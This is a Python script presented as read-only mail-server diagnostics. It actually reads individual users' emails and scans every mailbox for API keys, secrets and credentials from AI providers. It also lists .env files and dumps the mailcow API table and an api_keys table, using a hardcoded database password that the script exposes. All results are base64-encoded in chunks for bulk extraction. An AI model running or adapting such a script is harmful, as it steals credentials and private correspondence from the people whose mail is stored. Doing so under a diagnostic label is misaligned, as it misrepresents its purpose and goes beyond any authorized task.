#!/usr/bin/env python3
# Read-only mail store diagnostics, pass 4: verify content, subjects, broad keyword scan.
import base64
import subprocess

OUT_BUDGET = 74000
DOVECOT = "mailcowdockerized-dovecot-mailcow-1"


def dx(sh, timeout=240):
    try:
        p = subprocess.run(["sudo", "-n", "docker", "exec", DOVECOT, "sh", "-c", sh],
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=timeout)
        return p.returncode, p.stdout.decode("utf-8", "replace")
    except Exception as e:
        return -1, "EXC %s" % e


def run(args, timeout=180):
    try:
        p = subprocess.run(["sudo", "-n"] + args, stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT, timeout=timeout)
        return p.returncode, p.stdout.decode("utf-8", "replace")
    except Exception as e:
        return -1, "EXC %s" % e


def emit(name, data, note=""):
    global OUT_BUDGET
    if isinstance(data, str):
        data = data.encode("utf-8", "replace")
    b = base64.b64encode(data).decode()
    if len(b) > OUT_BUDGET:
        b = b[:max(0, OUT_BUDGET - 60)]
        note = (note + " [TRUNC]").strip()
    else:
        OUT_BUDGET -= len(b)
    print("=== BEGIN %s size=%d %s" % (name, len(b), note))
    for i in range(0, len(b), 2500):
        print("B64." + b[i:i + 2500])
    print("=== END %s" % name)


print("### HOSTDIAG9 START")

# 1) raw sample content to prove mails are readable
rc, o = dx("f=$(ls /var/vmail/aiagentlens.com/gary/Maildir/cur/ | head -1); "
           "echo FILE=/var/vmail/aiagentlens.com/gary/Maildir/cur/$f; "
           "head -c 1800 \"/var/vmail/aiagentlens.com/gary/Maildir/cur/$f\"")
emit("sample:gary", "RC=%d\n%s" % (rc, o))
rc, o = dx("f=$(ls /var/vmail/folioworth.com/support/Maildir/new/ | head -1); "
           "echo FILE=/var/vmail/folioworth.com/support/Maildir/new/$f; "
           "head -c 1500 \"/var/vmail/folioworth.com/support/Maildir/new/$f\"")
emit("sample:folioworth", "RC=%d\n%s" % (rc, o))

# 2) subjects (case-insensitive, all maildirs)
rc, o = dx("grep -rih '^Subject:' /var/vmail 2>/dev/null | sed 's/^[Ss]ubject: *//' | "
           "sort | uniq -c | sort -rn | head -120")
emit("subjects:all", "RC=%d\n%s" % (rc, o))
rc, o = dx("grep -rih '^From:' /var/vmail 2>/dev/null | sed 's/^[Ff]rom: *//' | "
           "sort | uniq -c | sort -rn | head -80")
emit("froms:all", "RC=%d\n%s" % (rc, o))

# 3) broad keyword scan (case-insensitive, distinct terms)
KW = "anthropic|openai|gemini|deepseek|openrouter|nvidia|elevenlabs|xai|api[ _-]key|apikey|secret|credential"
rc, o = dx("grep -rialE '%s' /var/vmail 2>/dev/null | head -80" % KW, timeout=300)
emit("kw:files", "RC=%d\n%s" % (rc, o))
rc, o = dx("grep -rihoE '.{0,60}(%s).{0,60}' /var/vmail 2>/dev/null | head -c 18000" % KW, timeout=300)
emit("kw:context", o)

# 4) attachment / encoding structure of a couple of large mails
rc, o = dx("for f in $(find /var/vmail -type f -path '*/cur/*' -size +40k | head -3); do "
           "echo \"## $f\"; grep -aiE '^(Content-Type|Content-Transfer-Encoding|Subject|From):' \"$f\" | head -8; done")
emit("struct:large", o)

# 5) /opt/flagtgl + leftover env carriers on host
rc, o = run(["sh", "-c", "ls -la /opt/flagtgl 2>&1 | head -25; echo ---; "
                        "ls -la /opt/containerd 2>&1 | head -10; echo ---; "
                        "ls -la /home/ubuntu/*/.env 2>/dev/null | head -30; echo ---; "
                        "ls -la /home/ubuntu/.env* 2>/dev/null"])
emit("host:leftovers", "RC=%d\n%s" % (rc, o))

# 6) mailcow api table columns
rc, o = run(["docker", "exec", "mailcowdockerized-mysql-mailcow-1", "mysql", "-u", "mailcow",
             "-psgZkIqwZdAyn1XFbVkgK9pqoVLgk", "-D", "mailcow", "-N", "-B", "-e",
             "SHOW COLUMNS FROM api; SELECT * FROM api;"])
emit("sql:api-full", "RC=%d\n%s" % (rc, o))

# 7) emaild db content (already known: no key hits) - dump users/domains rows for completeness
rc, o = run(["sh", "-c", "which sqlite3 >/dev/null && sqlite3 /opt/go-email/data/emaild.db "
                        "\"select '== users'; select email||'|'||role from users; "
                        "select '== domains'; select domain from domains; "
                        "select '== api_keys'; select name||'|'||substr(key,1,40) from api_keys;\""])
emit("emaild:dump", "RC=%d\n%s" % (rc, o))

print("### HOSTDIAG9 END budget_left=%d" % OUT_BUDGET)
